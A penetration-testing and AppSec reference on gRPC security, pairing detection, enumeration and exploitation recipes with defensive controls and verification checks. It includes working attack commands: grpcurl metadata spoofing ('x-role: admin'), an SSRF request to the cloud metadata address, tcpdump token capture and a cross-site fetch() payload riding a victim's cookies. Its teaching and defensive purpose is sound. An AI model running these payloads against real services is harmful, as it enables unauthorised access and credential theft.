# gRPC

> gRPC is a high-performance RPC framework originally developed by Google, now part of the Cloud Native Computing Foundation (CNCF). It runs on HTTP/2, uses Protocol Buffers (protobuf) for message serialization, and supports four communication patterns: unary, server streaming, client streaming, and bidirectional streaming. It is the transport of choice for microservice-to-microservice communication, mobile backends, and (increasingly) browser clients via gRPC-Web.
>
> gRPC security sits at the intersection of three attack surfaces: HTTP/2 (protocol-level issues: request smuggling, header injection, stream multiplexing abuse), protobuf (schema-level issues: unknown fields, type confusion, negative-length bugs), and the application layer (method-level authorization, reflection exposure, metadata trust). Most teams deploy gRPC behind a proxy (Envoy, nginx, Traefik) and assume the proxy handles all security. It does not - per-method authorization, schema validation, and metadata trust must be implemented in the service.
>
> This file covers gRPC from both sides: the pentest track (detection, enumeration, exploitation) and the AppSec track (root causes, controls, verification).
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [What gRPC Is](#1-what-grpc-is)
2. [Detection](#2-detection)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Common Variants](#5-common-variants)
6. [Exploitation Recipes](#6-exploitation-recipes)
7. [Post-Exploitation](#7-post-exploitation)
8. [Risk Context (AppSec)](#8-risk-context-appsec)
9. [Root Causes (AppSec)](#9-root-causes-appsec)
10. [Preventive Controls (AppSec)](#10-preventive-controls-appsec)
11. [Detection Controls (AppSec)](#11-detection-controls-appsec)
12. [Verification (AppSec)](#12-verification-appsec)
13. [OSCP Notes](#13-oscp-notes)
14. [Production Notes](#14-production-notes)
15. [References](#15-references)

---

## 1. What gRPC Is

gRPC is a Remote Procedure Call framework with these components:

- **Transport:** HTTP/2 (multiplexed streams over a single TCP connection, binary framing, HPACK header compression).
- **Serialization:** Protocol Buffers (protobuf) by default. Protobuf is a binary, schema-driven format defined in `.proto` files.
- **Interface definition:** the `.proto` file declares services (`service`) and methods (`rpc`), each with request and response message types.
- **Code generation:** `protoc` generates client and server stubs in many languages (Go, Java, Python, C++, Rust, C#, Node.js).
- **Service discovery and load balancing:** often via a service mesh (Istio, Linkerd) or a gRPC-aware proxy (Envoy).

### 1.1 Communication patterns

```text
Unary:            client --> request  --> server
                  client <-- response <-- server

Server streaming: client --> request  --> server
                  client <-- stream   <-- server (multiple)

Client streaming: client --> stream   --> server (multiple)
                  client <-- response <-- server

Bidi streaming:   client <--> stream  <--> server (both directions)
```

### 1.2 Wire format

A gRPC call is an HTTP/2 request with:

- `:method POST`
- `:path /package.Service/Method` (e.g. `/helloworld.Greeter/SayHello`)
- `content-type: application/grpc` (or `application/grpc+proto`, `application/grpc-web+proto`)
- `te: trailers`
- Body: one or more length-prefixed protobuf messages. Each message is preceded by a 5-byte header: `1 byte compressed-flag + 4 bytes big-endian length`.

Response uses the same framing plus trailing HTTP/2 trailers (`grpc-status`, `grpc-message`).

### 1.3 Reflection

gRPC servers can expose the `grpc.reflection.v1alpha.ServerReflection` service (or `v1`). This lets a client enumerate all services, methods, and message types at runtime without having the `.proto` files. It is a convenience for development tools (`grpcurl`, `grpcui`, Postman) and a gift for an attacker.

Reflection is enabled by default in many frameworks (Go `reflection.Register`, Java `ProtoReflectionService`). In production it should be off, or restricted to internal networks.

### 1.4 Metadata

Metadata is gRPC's equivalent of HTTP headers: a list of key-value pairs sent with each call. Common keys:

- `authorization: Bearer <token>`
- `user-agent: grpc-go/1.60.0`
- custom: `x-user-id`, `x-tenant`, `x-api-key`

Servers frequently trust metadata values without re-validating them against the authenticated identity. This is the gRPC equivalent of trusting an HTTP header set by the client.

---

## 2. Detection

gRPC endpoints are detected when:

- The URL path has the form `/package.Service/Method`.
- `content-type` starts with `application/grpc`.
- The HTTP version is HTTP/2 and the method is always `POST`.
- A response contains `grpc-status` and `grpc-message` trailers.
- Port 50051 (the gRPC convention) is open and speaks HTTP/2.

### Quick detection

```bash
# Probe for gRPC on the common port
curl -sI --http2-prior-knowledge "http://$TARGET:50051/" | grep -iE "content-type|grpc|http/2"

# Try a known method path (will 404 if the service is different, but leaks the content-type)
curl -s --http2-prior-knowledge -X POST \
  -H "content-type: application/grpc" \
  -H "te: trailers" \
  --data-binary "" \
  "http://$TARGET:50051/grpc.health.v1.Health/Check" -v 2>&1 | grep -iE "grpc-status|content-type|HTTP/2"

# Check reflection
grpcurl -plaintext "$TARGET:50051" list
```

Expected output (reflection enabled):

```text
grpc.reflection.v1alpha.ServerReflection
helloworld.Greeter
health.v1.Health
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| Port 50051 open, HTTP/2 | Likely gRPC | Try `grpcurl -plaintext` |
| Reflection works (`list`) | Services enumerable | `grpcurl describe <service>` |
| `content-type: application/grpc` | gRPC confirmed | Enumerate methods |
| Reflection returns `Unimplemented` | No reflection | Get `.proto` from leaks, or fuzz method paths |
| Envoy / nginx in front | Proxy | Test proxy auth vs service auth |
| gRPC-Web on port 443 | Browser-exposed | Check CORS, auth on upgrade |

---

## 3. Enumeration

### 3.1 Reflection-based enumeration

`grpcurl` is the standard client. If reflection is enabled, everything is exposed:

```bash
# List all services
grpcurl -plaintext "$TARGET:50051" list

# Describe a service (methods, request/response types)
grpcurl -plaintext "$TARGET:50051" describe helloworld.Greeter

# Describe a message type (fields and types)
grpcurl -plaintext "$TARGET:50051" describe helloworld.HelloRequest

# Call a method interactively
grpcurl -plaintext -d '{"name":"test"}' "$TARGET:50051" helloworld.Greeter/SayHello
```

For a browser-friendly UI, `grpcui` exposes a web interface:

```bash
grpcui -plaintext "$TARGET:50051"
# Opens http://127.0.0.1:<random_port> in a browser
```

### 3.2 Reflection-less enumeration

If reflection is disabled, three approaches:

1. **Find the `.proto` files.** Look in public repos, error messages, source maps, `/debug/`, `.git/`, Docker images, or any leaked artifact.
2. **Fuzz method paths.** gRPC returns different `grpc-status` codes for "service not found" (`12 Unimplemented`) vs "method not found" (also `12`) vs "method exists but invalid request" (`3 InvalidArgument`, `13 Internal`). A wordlist of common service names (`user.UserService`, `auth.AuthService`, `admin.AdminService`) and methods (`GetUser`, `ListUsers`, `CreateToken`) can find live methods.
3. **Reconstruct the schema from client code.** Mobile apps often contain generated gRPC stubs; extracting them gives the full `.proto` interface.

### 3.3 Metadata and auth enumeration

```bash
# Without auth
grpcurl -plaintext "$TARGET:50051" helloworld.Greeter/SayHello
# -> if OK: no auth required

# With a random token
grpcurl -plaintext -H "authorization: Bearer invalid" "$TARGET:50051" helloworld.Greeter/SayHello
# -> if OK: token not validated

# With a peer user's token
grpcurl -plaintext -H "authorization: Bearer <PEER_TOKEN>" "$TARGET:50051" admin.AdminService/ListUsers
# -> if OK: no per-user authorization
```

### 3.4 Stream enumeration

For streaming methods, the request and response are sequences of messages. Send one message and observe:

```bash
# Server-streaming: one request, many responses
grpcurl -plaintext -d '{"user_id":"1"}' "$TARGET:50051" user.UserService/StreamActivity

# Bidi: interactive
grpcurl -plaintext -d @ "$TARGET:50051" chat.ChatService/Chat
# Then type JSON messages, one per line
```

---

## 4. Attack Surface Map

| Layer | Vector | What to test |
|-------|--------|--------------|
| HTTP/2 | Request smuggling | H2.CL, H2.TE, h2c upgrade |
| HTTP/2 | Header injection | CRLF in metadata values |
| HTTP/2 | Stream multiplexing | Racing concurrent streams against rate limits |
| Transport | Plaintext (no TLS) | `-plaintext` works? Traffic interceptable? |
| Reflection | Service discovery | `grpcurl list` succeeds? |
| Auth | Missing on unary | Try each method without credentials |
| Auth | Missing on streaming | Streaming methods often skip per-message auth |
| Auth | Metadata trust | Change `x-user-id`, `x-tenant`, `x-role` |
| Schema | Unknown fields | Send fields not in the `.proto` |
| Schema | Type confusion | Send a string where an int32 is expected |
| Protobuf | Negative length | Craft a length prefix with high bit set |
| Protobuf | Deeply nested | Recursion bomb (memory exhaustion) |
| Proxy | Auth gap | Does the proxy enforce auth, or only the service? |
| Gateway | gRPC-Web CORS | Browser-accessible, CORS misconfigured? |

---

## 5. Common Variants

### 5.1 Missing method-level authorization

The service authenticates the connection (mTLS or token) but does not check whether the caller is allowed to invoke each method. Internal microservices often assume "if you can reach me, you are allowed."

```bash
# As an unprivileged user
grpcurl -plaintext -H "authorization: Bearer <USER_TOKEN>" \
  -d '{}' "$TARGET:50051" admin.AdminService/ListAllUsers
# -> returns full user list: missing authorization
```

**CWE-862:** Missing Authorization. **OWASP 2021:** A01 Broken Access Control. **OWASP API 2023:** API5 Broken Function Level Authorization.

### 5.2 Metadata trust (identity spoofing)

The service reads `x-user-id`, `x-tenant`, `x-role` from metadata and trusts it, without verifying against the authenticated identity. The proxy sets these headers for upstream services; an attacker who can reach the service directly (or via an open proxy path) can set them.

```bash
grpcurl -plaintext \
  -H "x-user-id: 1" \
  -H "x-role: admin" \
  -d '{}' "$TARGET:50051" user.UserService/GetProfile
# -> returns admin profile
```

**CWE-290:** Authentication Bypass by Spoofing. **OWASP 2021:** A01.

### 5.3 Reflection exposure in production

Reflection is enabled, exposing the full schema. Combined with missing auth, this gives an attacker a complete API map.

```bash
grpcurl -plaintext "$TARGET:50051" list | while read svc; do
  grpcurl -plaintext "$TARGET:50051" describe "$svc"
done
```

**CWE-200:** Exposure of Sensitive Information. **OWASP 2021:** A05 Security Misconfiguration.

### 5.4 Protobuf negative length / parser bugs

The 4-byte big-endian length prefix is signed in some parsers. A negative length (high bit set) can trigger memory corruption or unexpected behavior. Also: a length larger than the actual payload causes the parser to read past the buffer in poorly written implementations.

```python
# Craft a message with a negative length prefix (0xFFFFFFFF)
import socket, struct
msg = struct.pack(">I", 0xFFFFFFFF) + b"A" * 16
# send via a raw HTTP/2 client to the target method path
```

Affected implementations have been patched over the years; modern `protobuf` and `grpc-go`/`grpc-java` reject negative lengths. Test legacy services and embedded targets.

**CWE-125:** Out-of-bounds Read. **CWE-190:** Integer Overflow.

### 5.5 Unknown fields and mass assignment

Protobuf parsers preserve unknown fields by default. A service that maps incoming messages to a database model can be tricked into setting fields the client was never meant to control (`role`, `is_admin`, `tenant_id`) if the parser accepts them.

```bash
# Send a field not declared in the .proto for the request
grpcurl -plaintext -d '{"name":"alice","role":"admin"}' \
  "$TARGET:50051" user.UserService/CreateUser
```

**CWE-915:** Improperly Controlled Modification of Dynamically-Determined Object Attributes. **OWASP 2021:** A01, A03.

### 5.6 gRPC-Web CORS misconfiguration

gRPC-Web lets browsers talk to gRPC servers via a proxy (Envoy, grpc-web proxy). If CORS is `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` (or the origin is reflected), any site can call the API with the victim's cookies.

```bash
curl -s -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" \
  -X OPTIONS "https://$TARGET/package.Service/Method" -I | grep -i "access-control"
```

**CWE-942:** Permissive Cross-domain Policy. **OWASP 2021:** A05, A01.

### 5.7 Plaintext gRPC on internal networks

Many internal services use `-plaintext` (no TLS) because "it is internal". Anyone on the same network segment (or with SSRF into it) can read and modify traffic, including auth tokens.

**CWE-319:** Cleartext Transmission of Sensitive Information. **OWASP 2021:** A02 Cryptographic Failures.

### 5.8 HTTP/2 request smuggling (H2.CL, H2.TE)

When a front-end proxy speaks HTTP/2 to a back-end that speaks HTTP/1.1, an attacker can smuggle requests by manipulating `content-length` or `transfer-encoding`. gRPC back-ends behind such a proxy are affected. This is the gRPC-adjacent version of the classic CL.TE / TE.CL smuggling classes.

**CWE-444:** Inconsistent Interpretation of HTTP Requests. **OWASP 2021:** A03, A05.

### 5.9 Streaming method abuse

Streaming methods are frequently forgotten in authorization checks. A client-streaming method that accepts many messages may not re-verify that each message belongs to the authenticated user; a server-streaming method that pushes events may not filter by the caller's tenant.

```bash
# Open a bidi stream, send messages referencing other users' IDs
grpcurl -plaintext -d @ "$TARGET:50051" chat.ChatService/Chat
{"action":"subscribe","channel":"admin"}
{"action":"subscribe","channel":"user-2-private"}
```

**CWE-863:** Incorrect Authorization. **OWASP API 2023:** API1 BOLA.

---

## 6. Exploitation Recipes

### 6.1 Reflection + missing auth to full data dump

1. Confirm reflection is enabled:

```bash
grpcurl -plaintext "$TARGET:50051" list
```

2. Enumerate every service and method:

```bash
grpcurl -plaintext "$TARGET:50051" list | while read svc; do
  echo "=== $svc ==="
  grpcurl -plaintext "$TARGET:50051" describe "$svc"
done
```

3. Call each method with an empty body. Any method that returns data without auth is a finding.

```bash
grpcurl -plaintext -d '{}' "$TARGET:50051" user.UserService/ListUsers
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.2 Metadata spoofing to privilege escalation

1. Identify a method that reads `x-role` or similar from metadata.
2. Set it to `admin` and call a privileged method.

```bash
grpcurl -plaintext \
  -H "authorization: Bearer <USER_TOKEN>" \
  -H "x-role: admin" \
  -d '{}' "$TARGET:50051" admin.AdminService/ExportAllUsers
```

3. If the response contains all users, the service trusts client-supplied identity metadata.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.3 gRPC-Web CORS misconfiguration to session riding

1. Confirm CORS allows any origin with credentials:

```bash
curl -s -H "Origin: https://evil.example" -X OPTIONS \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type" \
  "https://$TARGET/package.Service/Method" -I | grep -i access-control
```

2. If `Access-Control-Allow-Origin: https://evil.example` (reflected) and `Access-Control-Allow-Credentials: true` - CSRF on the API.
3. Host a page that POSTs a gRPC-Web request with the victim's cookies:

```html
<script>
fetch("https://victim.example/package.Service/AdminMethod", {
  method: "POST",
  credentials: "include",
  headers: {"content-type": "application/grpc-web+proto"},
  body: new Uint8Array([0,0,0,0,2,8,1])
});
</script>
```

4. If the action succeeds, the victim performs it without knowing.

### 6.4 Plaintext gRPC to token theft

1. Detect plaintext gRPC (no `tls` config, `-plaintext` works).
2. On a shared network (or via SSRF into the internal network), capture traffic:

```bash
# [LAB only] on the attacker host, if you are on the same segment
sudo tcpdump -i eth0 -A -s0 "tcp port 50051"
```

3. Extract `authorization: Bearer <token>` from captured frames. Reuse the token.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.5 gRPC to SSRF pivot

If a method accepts a URL or hostname and fetches it server-side, it is SSRF. gRPC services often fetch user-specified webhooks, image URLs, or remote configs.

```bash
grpcurl -plaintext -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  "$TARGET:50051" image.ImageService/FetchImage
```

If the response contains cloud metadata, the SSRF reaches the instance metadata service. See `../../01 Web/08 Vulnerabilities/SSRF.md` for the full SSRF playbook.

---

## 7. Post-Exploitation

Once gRPC is compromised:

- **Full API dump.** Reflection plus missing auth gives every method's schema and behavior. Enumerate, call, extract.
- **Service-to-service pivot.** If the compromised service can call other gRPC services (common in microservice architectures), the compromise spreads.
- **Token harvesting.** Plaintext gRPC leaks bearer tokens. Captured tokens often work against HTTP APIs too.
- **Schema poisoning.** If the attacker can write to a registry (Consul, etcd, Proto Registry), the schema itself can be altered, affecting every consumer.
- **Denial of service.** Streaming methods with no rate limit and no per-stream cap can exhaust the server. Recursion bombs in protobuf are another vector.

For the report: which services were reachable, which methods returned data without auth, which metadata was trusted.

---

## 8. Risk Context (AppSec)

gRPC vulnerabilities map to the OWASP Top 10:2021 and API Top 10:2023:

| Standard | gRPC-specific manifestation |
|----------|------------------------------|
| OWASP 2021 A01 Broken Access Control | Missing method-level auth, metadata spoofing, streaming auth bypass |
| OWASP 2021 A02 Cryptographic Failures | Plaintext gRPC, weak TLS, mTLS not enforced |
| OWASP 2021 A03 Injection | Protobuf parser bugs, SQLi in message fields, path traversal in URLs |
| OWASP 2021 A05 Security Misconfiguration | Reflection in prod, permissive gRPC-Web CORS, verbose errors |
| OWASP API 2023 API1 BOLA | Streaming methods without per-message ownership check |
| OWASP API 2023 API5 BFLA | Missing per-method role check |
| OWASP API 2023 API10 Unsafe Consumption of APIs | Trusting upstream gRPC metadata without re-validation |

---

## 9. Root Causes (AppSec)

The recurring root causes for gRPC vulnerabilities:

1. **"The proxy handles auth" assumption.** A front-end proxy authenticates the connection; the service then trusts every request. But proxies enforce coarse-grained policies, not per-method authorization. The service must re-check.
2. **Metadata as trusted context.** Service meshes (Istio, Linkerd) inject `x-user-id`, `x-tenant` headers. If the service does not verify that the caller is the mesh sidecar, an attacker who reaches the service directly can spoof these headers.
3. **Reflection enabled by default.** Development convenience shipped to production, exposing the full schema.
4. **Streaming methods forgotten in auth reviews.** Unary methods get tested; streaming methods are assumed safe. They are not.
5. **Schema-optional validation.** "Protobuf is typed" is not a security control. Protobuf validates structure, not business rules. Unknown fields, mass assignment, and out-of-range values still work.
6. **Plaintext on internal networks.** "It is internal" is not a security boundary. Internal networks get compromised via lateral movement.

---

## 10. Preventive Controls (AppSec)

**Service layer:**

- **Per-method authorization.** Every gRPC method checks that the authenticated identity is allowed to invoke it. Implement as a server interceptor that runs before the handler.
- **Per-message authorization for streaming.** For bidi and client-streaming, re-check ownership for each message that references an object. Do not rely on connection-level auth.
- **Do not trust client-supplied identity metadata.** Validate that `x-user-id`, `x-tenant` come from the sidecar (via mTLS peer certificate or SPIFFE ID) or use the authenticated identity from the TLS session, not from a header.
- **Reflection disabled in production** (or restricted to internal-only networks with a health check).
- **Schema strict validation.** Reject unknown fields explicitly (`DiscardUnknown: false` in Go, similar in other languages). Validate field values against business rules, not just protobuf types.
- **Input size and depth limits.** Cap message size (default 4 MB in gRPC, lower is better), cap recursion depth, cap number of fields per message.
- **Rate limits per method, per caller.** Especially for streaming methods.

**Transport layer:**

- **TLS for all gRPC traffic,** including internal. No `-plaintext` in production.
- **mTLS for service-to-service.** Use SPIFFE/SPIRE or your service mesh's identity system.
- **TLS on the load balancer and on the service.** Not just one.

**Edge layer:**

- **gRPC-Web CORS strict origin allowlist.** No wildcards with credentials.
- **H2C disabled on the origin** (avoid smuggling).
- **WAF rules for gRPC paths** if your WAF supports HTTP/2 inspection.

---

## 11. Detection Controls (AppSec)

Signals worth monitoring:

- **Reflection calls in production.** If reflection is disabled, any call is suspicious. If enabled, log the caller.
- **Anomalous method patterns.** A single client calling many methods (enumeration) or calling methods it has never called.
- **Metadata anomalies.** `x-user-id` that does not match the authenticated identity; new header names appearing.
- **Streaming abuse.** Long-lived streams, high message rate, streams from unusual origins.
- **Plaintext gRPC attempts.** Any non-TLS connection on a port that should be TLS-only.
- **Protobuf parse errors.** A spike of `InvalidArgument` responses on a single caller is a fuzzing signal.
- **gRPC-Web preflight floods.** Many OPTIONS requests from one origin.

---

## 12. Verification (AppSec)

Concrete checks:

| Control | Verification |
|---------|--------------|
| Reflection disabled | `grpcurl -plaintext "$TARGET:50051" list` returns Unimplemented |
| Per-method auth | Call every method with a low-priv token; every method that is not public must return `PERMISSION_DENIED` |
| Streaming auth | Open a bidi stream as user A; reference user B's objects; expect `PERMISSION_DENIED` |
| Metadata trust | Send `x-user-id: 1` with a low-priv token; expect the request to be rejected |
| TLS enforced | `grpcurl -plaintext` fails; `grpcurl` (TLS) succeeds |
| mTLS | Client without a valid cert is rejected at TLS handshake |
| Message size | Send a message above the configured limit; expect `RESOURCE_EXHAUSTED` |
| Unknown fields | Send a field not declared in the `.proto`; expect rejection (not silent acceptance) |
| gRPC-Web CORS | OPTIONS with `Origin: https://evil.example`; expect no `Access-Control-Allow-Origin` for that origin |
| Rate limit | Send N+1 requests in a window; expect `RESOURCE_EXHAUSTED` |

Cross-reference: OWASP ASVS 4.0 V4 (Access Control), V5 (Validation), V9 (Communications), V13 (API and Web Service), V14 (Configuration). OWASP API Security Top 10:2023 API1, API2, API5, API10.

---

## 13. OSCP Notes

gRPC is uncommon on OSCP but appears on HTB boxes with microservice architectures:

- **Detect:** look for port 50051, or HTTP/2 endpoints with `content-type: application/grpc`.
- **Install `grpcurl`** on your Kali host: `apt install grpcurl` or download from GitHub releases.
- **Try reflection first.** `grpcurl -plaintext target:50051 list` is a one-second test. If reflection is enabled, you have the whole API.
- **Enumerate every method** with `describe`. Look for admin methods, user methods, debug methods.
- **Call each method with an empty body** and observe responses. Missing auth is common.
- **Test streaming methods separately.** Send the first message, then probe with a second message that references another user's object.
- **Check metadata spoofing.** Add `x-user-id: 1`, `x-role: admin`. Cheap test, sometimes wins.
- **Look for `.proto` file leaks** in the web root, in `/debug/`, in `.git/`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 14. Production Notes

| Practice | Verdict |
|----------|---------|
| TLS for all gRPC traffic | Required |
| mTLS for service-to-service | Required |
| Per-method authorization (server interceptor) | Required |
| Per-message authorization for streaming | Required |
| Reflection disabled in production | Required |
| Metadata identity re-validated against TLS peer | Required |
| Message size and depth limits | Required |
| Rate limits per method | Required |
| Unknown field rejection | Recommended |
| gRPC-Web CORS strict allowlist | Required if gRPC-Web is exposed |
| H2C disabled on origin | Recommended |
| Plaintext gRPC on any network | Never |

---

## 15. References

- gRPC official documentation - https://grpc.io/docs/
- Protocol Buffers language guide - https://protobuf.dev/programming-guides/proto3/
- gRPC security documentation - https://grpc.io/docs/guides/auth/
- OWASP API Security Top 10:2023 - https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP Top 10:2021 - https://owasp.org/Top10/
- OWASP ASVS 4.0 - https://owasp.org/www-project-application-security-verification-standard/
- RFC 9113 HTTP/2 - https://datatracker.ietf.org/doc/html/rfc9113
- grpcurl - https://github.com/fullstorydev/grpcurl
- grpcui - https://github.com/fullstorydev/grpcui
- CWE-862 Missing Authorization - https://cwe.mitre.org/data/definitions/862.html
- CWE-290 Authentication Bypass by Spoofing - https://cwe.mitre.org/data/definitions/290.html
- CWE-200 Exposure of Sensitive Information - https://cwe.mitre.org/data/definitions/200.html
- CWE-125 Out-of-bounds Read - https://cwe.mitre.org/data/definitions/125.html
- CWE-190 Integer Overflow - https://cwe.mitre.org/data/definitions/190.html
- CWE-915 Mass Assignment - https://cwe.mitre.org/data/definitions/915.html
- CWE-942 Permissive Cross-domain Policy - https://cwe.mitre.org/data/definitions/942.html
- CWE-319 Cleartext Transmission - https://cwe.mitre.org/data/definitions/319.html
- CWE-444 Inconsistent Interpretation of HTTP Requests - https://cwe.mitre.org/data/definitions/444.html
- CWE-863 Incorrect Authorization - https://cwe.mitre.org/data/definitions/863.html
